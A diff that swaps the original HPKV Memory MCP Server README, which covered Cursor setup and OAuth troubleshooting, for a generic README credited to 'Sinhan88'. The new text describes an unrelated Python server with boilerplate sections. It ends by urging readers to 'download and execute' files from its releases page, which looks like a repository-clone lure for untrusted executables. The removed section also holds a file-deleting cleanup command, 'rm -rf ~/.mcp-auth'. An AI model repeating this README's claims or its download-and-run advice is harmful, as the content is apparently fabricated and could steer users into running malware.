@@ -1,53 +1,166 @@
-# Memory MCP Server - Cursor Rules
+# 🧠 Memory MCP Server
 
-This repository contains the Cursor rule document for integrating the HPKV Memory MCP Server with Cursor IDE. The Memory MCP Server provides long-term memory capabilities for LLMs in Cursor, allowing AI assistants to remember conversations across sessions.
+![Memory MCP Server](https://img.shields.io/badge/Memory%20MCP%20Server-v1.0.0-blue.svg)
+![GitHub Releases](https://img.shields.io/badge/Releases-latest-orange.svg)
 
-## What is this?
+---
 
-The Memory MCP Server implements the Model Context Protocol (MCP) to give LLMs true long-term memory. This rule document enables Cursor IDE to:
+## Overview
 
-- Remember project structures and conventions across sessions
-- Recall user preferences for coding style and patterns
-- Reference previous explanations and decisions
-- Avoid hallucinating non-existent code and functions
-- Stop suggesting previously failed approaches
+Welcome to the **Memory MCP Server**! This project implements the Model Context Protocol (MCP) to provide long-term memory for Large Language Models (LLMs). With the growing need for more context-aware AI applications, this server acts as a bridge, allowing LLMs to retain information over extended interactions.
 
-In short, it makes AI coding assistants in Cursor much more reliable by giving them access to persistent memory.
+## Table of Contents
 
-## Adding to Cursor IDE
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-1. Create a free [HPKV account](https://hpkv.io/signup) and create an API Key in Dashboard.
-   
-2. Edit your `mcp.json` file:
+## Features
 
-```json
-{
-  "mcpServers": {
-    "hpkv-memory-server": {
-      "command": "npx",
-      "args": ["mcp-remote", "https://memory-mcp.hpkv.io/sse"]
-    }
+- **Long-term Memory**: Store and retrieve context for LLMs, enhancing their ability to provide relevant responses.
+- **Model Context Protocol**: Adhere to the MCP standards for seamless integration with various LLM architectures.
+- **User-Friendly API**: Easy-to-use API for developers to integrate memory functionalities into their applications.
+- **Scalability**: Designed to handle multiple requests and scale with your needs.
+
+## Installation
+
+To get started with the Memory MCP Server, follow these steps:
+
+1. **Clone the Repository**:
+
+   ```bash
+   git clone https://github.com/Sinhan88/memory-mcp-server.git
+   ```
+
+2. **Navigate to the Project Directory**:
+
+   ```bash
+   cd memory-mcp-server
+   ```
+
+3. **Install Dependencies**:
+
+   Make sure you have Python and pip installed. Then run:
+
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+4. **Run the Server**:
+
+   Execute the following command to start the server:
+
+   ```bash
+   python app.py
+   ```
+
+## Usage
+
+Once the server is running, you can interact with it using the API endpoints. Here’s a quick guide on how to use the Memory MCP Server.
+
+### API Endpoints
+
+- **Store Memory**: Send a POST request to `/store` with the following JSON body:
+
+  ```json
+  {
+      "context": "Your context here",
+      "model_id": "unique_model_identifier"
   }
-}
-```
+  ```
 
-3. After adding the Memory MCP Server, you'll be prompted to login to your HPKV account. After that you can select the API key you generated.
-  
-4. Add the memory cursor rule to your project and set the rule type to `Always`.
+- **Retrieve Memory**: Send a GET request to `/retrieve?model_id=unique_model_identifier`.
 
-## Cursor Rule Document
+### Example Requests
 
-The [memory_tool_usage_guide.mdc](./memory_tool_usage_guide.mdc) file contains the rules that instruct Cursor's AI how to properly use the memory tools. It includes:
+Using `curl`, you can test the API as follows:
 
-- Guidelines for when to search memory before responding
-- Patterns for storing important information
-- Best practices for memory retrieval
-- Naming conventions for organizing memories
+1. **Store Memory**:
 
-## OAuth Troubleshooting
+   ```bash
+   curl -X POST http://localhost:5000/store -H "Content-Type: application/json" -d '{"context": "I love programming.", "model_id": "model_1"}'
+   ```
 
-In certain situations, `mcp-remote` might have trouble refreshing your token and it consitantly generates new Client IDs that lead to the loop of trying to register a new Client ID, openning API Key selection page and goingback to generating a new Client ID. To fix this, disable the MCP server in Cursor, kill all `mcp-remote` processes and clear the `.mcp-auth` folder with a command similar to `pkill -f mcp-remote && rm -rf ~/.mcp-auth` and then re-enable it in Cursor. This should fix any authentication issue you were experiencing. 
+2. **Retrieve Memory**:
 
-## Learn More
+   ```bash
+   curl http://localhost:5000/retrieve?model_id=model_1
+   ```
 
-For more information, check out our [blog post about Memory MCP](https://hpkv.io/blog/2025/04/mcp-memory-with-hpkv) and the [HPKV documentation](https://hpkv.io/docs).
+## Contributing
+
+We welcome contributions to the Memory MCP Server! If you want to help, please follow these steps:
+
+1. **Fork the Repository**: Click the "Fork" button at the top right of this page.
+2. **Create a Branch**: 
+
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+
+3. **Make Your Changes**: Edit the code, add features, or fix bugs.
+4. **Commit Your Changes**: 
+
+   ```bash
+   git commit -m "Add your message here"
+   ```
+
+5. **Push to the Branch**: 
+
+   ```bash
+   git push origin feature/YourFeature
+   ```
+
+6. **Open a Pull Request**: Go to the original repository and click "New Pull Request".
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+
+## Contact
+
+For any questions or feedback, feel free to reach out:
+
+- **Author**: Sinhan88
+- **Email**: sinhan88@example.com
+- **GitHub**: [Sinhan88](https://github.com/Sinhan88)
+
+## Releases
+
+You can find the latest releases of the Memory MCP Server [here](https://github.com/Sinhan88/memory-mcp-server/releases). Please download and execute the appropriate file for your system.
+
+## Additional Resources
+
+- **Documentation**: More detailed documentation is available in the `docs` folder.
+- **Community**: Join our [discussion forum](https://github.com/Sinhan88/memory-mcp-server/discussions) to share ideas and get help.
+
+## Acknowledgments
+
+Thanks to the contributors and the community for their support. Special thanks to the developers of the libraries that made this project possible.
+
+---
+
+## Topics
+
+This repository covers various topics including:
+
+- **claude**
+- **cursor**
+- **cursor-ai**
+- **cursorai**
+- **llm**
+- **llm-memory**
+- **llms**
+- **mcp**
+- **mcp-server**
+- **model-context-protocol**
+
+Feel free to explore these topics further!
+
+---
+
+Thank you for visiting the Memory MCP Server repository! We hope you find it useful for your projects involving LLMs and long-term memory.
